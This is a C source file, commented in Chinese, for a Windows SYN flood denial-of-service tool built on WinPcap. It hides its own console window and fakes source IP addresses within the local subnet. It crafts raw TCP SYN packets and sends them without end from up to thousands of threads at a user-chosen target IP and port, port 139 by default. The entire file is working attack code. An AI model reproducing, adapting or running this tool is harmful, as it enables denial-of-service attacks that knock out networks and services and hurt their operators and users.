#include "synpacket.h" 

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )		  // 设置入口地址 隐藏执行

int main(int argc,char* argv[])
{ 
	unsigned long ip = 0;					//IP地址 
	//step0: 产生随机因子，伪装随机IP与PORT
	srand((unsigned)time(0));
	//step1 : 输入参数
	getInput(argc,argv);
	//step2 : MAC 生成
	getMASKMAC();			//MAC地址获取与伪造
	//step3 : 网卡获取
	getNetworkCard();
	//step4 ：打开网卡  
	/*移动指针到用户选择的网卡 */ 

	//for(d=alldevs, cards=0; cards< inum-1 ;d=d->next, cards++); 

	//step5: 调用外部进程
	printf("\n--------------------------------\n");
	printf("%d 后停止\n",stopTime);
	creatSleep();
	printf("\n--------------------------------\n");

	d=alldevs;
	for(int  j=0; j< cards ;d=d->next, j++)
	{
		char *rst = NULL;
		char *rst2 = NULL;
		char *rst3 = NULL;
		char *rst4 = NULL;
		rst   = strstr(d->description,"VMware");
		rst2 = strstr(d->description,"Virtual");
		rst3 = strstr(d->description,"VPN");
		rst4 = strstr(d->description,"Tunnel");
		//字符串查找
		if ( ( rst>0) || (rst2>0) || (rst3 >0) || (rst4 >0))
		{
			continue;
		}
		//伪造MAC地址
		paraforthread.srcmac = GetSelfMac(d->name+8); //+8以去掉"rpcap://"  
		printf("IP %s\n",d->addresses->addr->sa_data);
		printf("\n\t[!debug]源mac %s\n",paraforthread.srcmac);
		printf("[choice card]%s\n",d->description);
		if ( (paraforthread.adhandle= pcap_open(d->name,		// name of the device 
			65536,																		// portion of the packet to capture 
			0,																				//open flag 
			1000,																		// read timeout 
			NULL,																		// authentication on the remote machine 
			errbuf																		// error buffer 
			) ) == NULL) 
		{ 
			fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name); 
			/* Free the device list */ 
			pcap_freealldevs(alldevs); 
			return -1; 
		} 
		//step6 ： 创建线程
#ifdef MUTEX
		//创建MUTEX
		hMutex = CreateMutex(
			NULL,
			FALSE,
			NULL);
		if (NULL==hMutex)
		{
			printf("CreateMutex error: %d\n",GetLastError());
		}
#endif
		for(pAddr=d->addresses; pAddr; pAddr=pAddr->next)
		{ 
			//得到用户选择的网卡的一个IP地址 
			pAddr=d->addresses;
			ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr; 

			//创建多线程
			for (int i=0;i<MAXTHREAD;i++)
			{   
				threadhandle[i]=CreateThread(NULL,
					0,
					SynfloodThread, 
					(void *)&paraforthread, 
					0, 
					NULL );
				if(!threadhandle)
				{
					printf("CreateThread error: %d\n",GetLastError());
				}
				Sleep(100);			
			}

		} 
		DWORD dwWaitResult=WaitForMultipleObjects(
			MAXTHREAD,             // number of handles in the handle array
			threadhandle,  // pointer to the object-handle array
			TRUE,            // wait flag
			INFINITE     // time-out interval in milliseconds
			);
		switch (dwWaitResult)
		{
		case WAIT_OBJECT_0:
			printf ("\nAll thread exit\n");
			break;
		default:
			printf("\nWait error: %u",GetLastError());
		}

	}
	
	return 0; 
} 
/** 
* 获得网卡的MAC地址 
* pDevName 网卡的设备名称 
*/ 
unsigned char* GetSelfMac(char* pDevName){ 
	
	static u_char mac[6]; 
	
	memset(mac,0,sizeof(mac)); 
	
	LPADAPTER lpAdapter = PacketOpenAdapter(pDevName); 
	
	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE)) 
	{ 
		return NULL; 
	} 
	
	PPACKET_OID_DATA OidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA)); 
	if (OidData == NULL) 
	{ 
		PacketCloseAdapter(lpAdapter); 
		return NULL; 
	} 
	// 
	// Retrieve the adapter MAC querying the NIC driver 
	// 
	OidData->Oid = OID_802_3_CURRENT_ADDRESS; 
	
	OidData->Length = 6; 
	memset(OidData->Data, 0, 6); 
	BOOLEAN Status = PacketRequest(lpAdapter, FALSE, OidData); 
	if(Status) 
	{ 
		memcpy(mac,(u_char*)(OidData->Data),6); 
	} 
	free(OidData); 
	PacketCloseAdapter(lpAdapter); 
	return mac; 
	
} 

/** 
* 封装ARP请求包 
* source_mac 源MAC地址 
* srcIP 源IP 
* destIP 目的IP 
*/ 
unsigned char* BuildSYNPacket(unsigned char* source_mac, unsigned char* dest_mac,
							  
							  unsigned long srcIp, unsigned long destIp,unsigned short dstPort)
							  
{  
	PSD_HEADER PsdHeader;
	//BYTE Buffer[46]={0};
	BYTE Buffer[74]={0};
	
	srcIp = htonl(ntohl(FakedIP) + rand()%ips);  //伪造本网段IP地址
	while(INADDR_NONE==srcIp)
	{ 
		
		
		srcIp = htonl(ntohl(FakedIP) + rand()%ips); 
	} 
	/****************           定义以太网头部         *************************/
	//目的MAC地址
	memcpy(packet.eth.eh_dst,dest_mac,6); 
	//源MAC地址 
	memcpy(packet.eth.eh_src,source_mac,6); 
	//上层协议为ARP协议，0x0806 
	packet.eth.eh_type = htons(0x0800); 
	/*******************          定义IP头        *********************/
    packet.iph.h_verlen =0;
	//packet.iph.h_verlen = ((4<<4)| sizeof(IP_HEADER)/sizeof(unsigned int));
	//首部优化
	packet.iph.h_verlen = 0x45;		//4 表示IPV4 ； 5表示 首部占 32bit字的数目
    packet.iph.tos = 0;
    packet.iph.total_len = htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));
    packet.iph.ident = CNT++;	//1		//标示可能需要修改
    packet.iph.frag_and_flags =htons(1<<14) ;
    packet.iph.ttl = 64;		
    packet.iph.proto = IPPROTO_TCP;
    packet.iph.checksum = 0;			//初始时校验和为0
    packet.iph.sourceIP =  srcIp ;
    packet.iph.destIP = destIp ;
	/********************          定义TCP头      **********************/
    packet.tcph.th_sport = htons( rand()%60000 + 1024 );
    packet.tcph.th_dport = htons(dstPort);
    packet.tcph.th_seq = htonl( rand()%900000000 + 100000 );
    packet.tcph.th_ack = 0;
	packet.tcph.th_data_flag=0;
	packet.tcph.th_data_flag=(11<<4|2<<8);
    packet.tcph.th_win = htons(8192);
    packet.tcph.th_sum = 0;
    packet.tcph.th_urp = 0;
	packet.tcph.option[0]=htonl(0X020405B4);
	packet.tcph.option[1]=htonl(0x01030303);
	packet.tcph.option[2]=htonl(0x0101080A);
	packet.tcph.option[3]=htonl(0x00000000);
	packet.tcph.option[4]=htonl(0X00000000);
    packet.tcph.option[5]=htonl(0X01010402);
	/********************         填充数据    *************************/
	//memset(packet.filldata,0,6);
	/******************           构造伪头部     ************************/
    PsdHeader.saddr = srcIp;
    PsdHeader.daddr = packet.iph.destIP;
    PsdHeader.mbz = 0;
    PsdHeader.ptcl = IPPROTO_TCP;
    PsdHeader.tcpl = htons(sizeof(TCP_HEADER));
    memcpy( Buffer, &PsdHeader, sizeof(PsdHeader) );
    memcpy( Buffer + sizeof(PsdHeader), &packet.tcph, sizeof(TCP_HEADER) );
    packet.tcph.th_sum = CheckSum( (unsigned short *)Buffer, sizeof(PsdHeader) 
		+ sizeof(TCP_HEADER));
	
    memset( Buffer, 0, sizeof(Buffer) );
    memcpy( Buffer, &packet.iph, sizeof(IP_HEADER) );
    packet.iph.checksum = CheckSum( (unsigned short *)Buffer, sizeof(IP_HEADER) );

	return (unsigned char*)&packet; 
} 


//计算校验和
unsigned short CheckSum(unsigned short * buffer, int size)
{
    unsigned long   cksum = 0;
	
    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size)
    {
        cksum += *(unsigned char *) buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
	
    return (unsigned short) (~cksum);
}

//发包线程函数
DWORD WINAPI SynfloodThread(LPVOID lp)
{   
//	SYSTEMTIME seedval;
	PARAMETERS paragmeters;
	paragmeters=*((LPPARAMETERS)lp);
	Sleep(10);

	unsigned char * packet;
	while(true)
	{   
#ifdef MUTEX
		 DWORD dwWaitsResult=WaitForSingleObject(
	     hMutex,        // handle to object to wait for
	     INFINITE   // time-out interval in milliseconds
	     );
		 switch (dwWaitsResult)
		 {
		 case WAIT_OBJECT_0:
#endif       
			 //GetLocalTime( &seedval );  // address of system time structure
			 //srand( (unsigned int)seedval.wSecond+(unsigned int)seedval.wMilliseconds );
			 packet = BuildSYNPacket(paragmeters.srcmac, paragmeters.dstmac,
				 paragmeters.sourceIP,paragmeters.destIP,paragmeters.destPort);
			 if(pcap_sendpacket(paragmeters.adhandle,packet, 78)==-1)
			 { 
				 fprintf(stderr,"pcap_sendpacket error.\n"); 
			 } 
			 else
			 {
				 sum ++ ;
				 printf("\b\b\b\b\b\b\b\b\b %i",sum);
			 }

#ifdef MUTEX
			 if (!ReleaseMutex(hMutex))
			 {
				 printf("Release Mutex error: %d\n",GetLastError());
			 }
			 break;
		 default:
			 printf("Wait error: %d\n",GetLastError());
			 ExitThread(0);
#endif
			 if (stopFlag == true)
			 {
				 printf("end\n");
				 return 0;		//退出线程
			 }
	}
	return 1;
}

void getMASKMAC()				//获取网关MAC
{
	//MAC填充
	//获得网管的MAC，以便填充目的端口
	char *p_Dev_name=G_device_name+strlen(G_device_name);

	if(GetLocalAdapter(p_Dev_name,(unsigned char *)G_device_mac,
		G_device_ip,G_device_netmask,G_gateway_ip)==FALSE)
	{
		printf("GetLocalAdapter ERROR!\n");
		exit(-1);
	}

	if(GetMacByArp(G_gateway_ip,(unsigned char*)G_dst_mac,6)==FALSE)		
	{ 
		printf("ERROR! GetMacByArp %s\n",iptos(G_gateway_ip));
		memset(G_dst_mac,0xff,6);
	}

	//此处替换成网关MAC

	paraforthread.dstmac[0]=G_dst_mac[0] & 0xff; 
	paraforthread.dstmac[1]=G_dst_mac[1] & 0xff;
	paraforthread.dstmac[2]=G_dst_mac[2] & 0xff;
	paraforthread.dstmac[3]=G_dst_mac[3] & 0xff;
	paraforthread.dstmac[4]=G_dst_mac[4] & 0xff;
	paraforthread.dstmac[5]=G_dst_mac[5] & 0xff;

	printf("\n\t[!debug]目的mac %x:%x:%x:%x:%x:%x\n",paraforthread.dstmac[0],paraforthread.dstmac[1],
		paraforthread.dstmac[2],paraforthread.dstmac[3],paraforthread.dstmac[4],paraforthread.dstmac[5]);
		//打印IP信息
	struct in_addr addrTest;
	addrTest.S_un.S_addr = G_gateway_ip;
	printf("\n\t[!debug]网关IP %s\n",inet_ntoa(addrTest));
	addrTest.S_un.S_addr = G_device_netmask;
	printf("\n\t[!debug]子网掩码 %s\n",inet_ntoa(addrTest));
	addrTest.S_un.S_addr = G_device_ip;
	printf("\n\t[!debug]网关IP %s\n",inet_ntoa(addrTest));
	//计算基本量
	FakedIP = G_device_netmask & G_device_ip;
	ips = ((unsigned long)inet_addr(maskBase)) - ntohl(G_device_netmask);
	addrTest.S_un.S_addr = FakedIP;
	printf("\n\t[!debug]IP数量 (%d) ->base IP : %s\n",ips,inet_ntoa(addrTest));
}

void getNetworkCard()
{
	/* 获得本机网卡列表 */ 
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) 
	{ 
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf); 
		exit(1); 
	} 
	/* 打印网卡列表 */ 
	for(d=alldevs; d; d=d->next) 
	{ 
		printf("%d", ++cards); 
		if (d->description) 
			printf(". %s\n", d->description); 
		else 
			printf(". No description available\n"); 
	} 
	//如果没有发现网卡 
	if(cards==0) 
	{ 
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n"); 
		exit(-1); 
	} 
}

void getInput(int argc,char *argv[])
{
	unsigned long  destIp = 0;						//目的IP
	unsigned short dstPort;					//目的端口
	char attrackIP[100];

	int attrackPORT = destToPort ,attrackThread = MAXTHREAD;

	if( 5==argc || 4 == argc || 3== argc || 2== argc)
	{ 
		printf("you input destIp dstPort  threads  %s \n",argv[0]);
		//根据命令行参数指定
		strcpy(attrackIP, argv[1]);
		if(2 == argc)
		{
			attrackPORT = 139;									//默认139端口
			attrackThread = 6000;								//默认开启6000个线程
		}else if (3==argc)
		{
			attrackPORT = atoi(argv[2]);						//目的端口
			attrackThread = 6000;								//默认开启6000个线程
		}
		else if(4 == argc)
		{
			attrackPORT = atoi(argv[2]);						//目的端口
			attrackThread = atoi(argv[3]);					//线程数
		}
		else
		{
			attrackPORT = atoi(argv[2]);						//目的端口
			attrackThread = atoi(argv[3]);					//线程数
			stopTime =(atoi(argv[4]) + 10) *SECOND;	
		}
	} 
	else
	{
		//没有在程序参数中输入IP PORT threads
		printf("attrack (ip) (port) (threads) (stopTime):");
		scanf("%s%d%d%d",attrackIP,&attrackPORT,&attrackThread,&stopTime);  
	}

	//写入参数并进行校验
	destIp=inet_addr(attrackIP);
	if(INADDR_NONE==destIp)
	{ 
		fprintf(stderr,"Invalid IP: %s\n",destIPAddr); 
		exit(-1); 
	} 
	//目的端口
	dstPort = attrackPORT;
	if(dstPort<1 || dstPort>65535)
	{
		dstPort = destToPort;			//当越界后自动归位
	}

	//填充线程的参数体
	paraforthread.destIP=destIp;
	paraforthread.destPort=dstPort;
	MAXTHREAD = attrackThread;

	//线程产生
	threadhandle = (HANDLE *) malloc(sizeof(HANDLE) * MAXTHREAD);
	if(NULL == threadhandle )
	{
		threadhandle = (HANDLE *) malloc(sizeof(HANDLE) * 6000);		//此处需要修改
	}
}

void creatSleep()
{
	stopFlag = false;
	sleepthreadhandle =  (HANDLE *) malloc(sizeof(HANDLE));
	//创建多线程
	*sleepthreadhandle = CreateThread(NULL,0,SleepThread, (void *)&paraforthread, 0, NULL );
	if(!sleepthreadhandle)
	{
			printf("CreateSleepThread error: %d\n",GetLastError());
	}
	Sleep(100);			
}

DWORD WINAPI SleepThread(LPVOID lp)			//sleep 线程调用函数
{
	printf("\t\t\t stop time thread start %d\n",stopTime);
	Sleep(stopTime);
	printf("\t\t\t stop time thread end \n");	
	stopFlag = true;
	exit(1);
	return 1;
}